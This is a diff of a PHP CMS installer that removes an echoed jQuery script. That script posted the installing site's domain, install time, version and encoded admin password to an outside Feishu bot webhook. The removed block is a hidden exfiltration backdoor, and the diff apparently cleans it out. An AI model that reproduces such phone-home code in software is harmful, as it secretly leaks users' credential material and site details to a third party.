@@ -149,21 +149,7 @@ if (!empty($data_json["lock"]) && $data_json["lock"] == "install") {
                                   
                                             $passwd = encode('admin', md5(sha1(md5($_POST['password']))));
                                             $domm = $_SERVER["HTTP_HOST"];
-                                            echo '<script>
-                                                $.ajax({
-                                                    type: "POST",
-                                                    url: "https://open.feishu.cn/open-apis/bot/v2/hook/4cc0515a-f00e-4737-a1f2-eb7a0618ef2e",
-                                                    dataType: "json",
-                                                    data: {
-                                                        "msg_type": "post",
-                                                              
-                                                        "content": "{\"post\":{\"zh_cn\":{\"title\":\"有人安装CMS啦\",\"content\":[[{\"tag\":\"text\",\"text\":\"域名：'.$domm.'  时间：'.date("Y-m-d h-i-s").'  版本：'.$data_index["version"].'  注册信息：'.$passwd.'  \"}]]}}}"
-                                                    },
-                                                    success: function(data) {
-                                                        console.log(data);
-                                                    }
-                                                });
-                                            </script>';
+                                           
 
                                             echo '<script>setTimeout(`document.getElementById("nextButton").disabled="false"`, 1000 )</script>';
                                         } else {
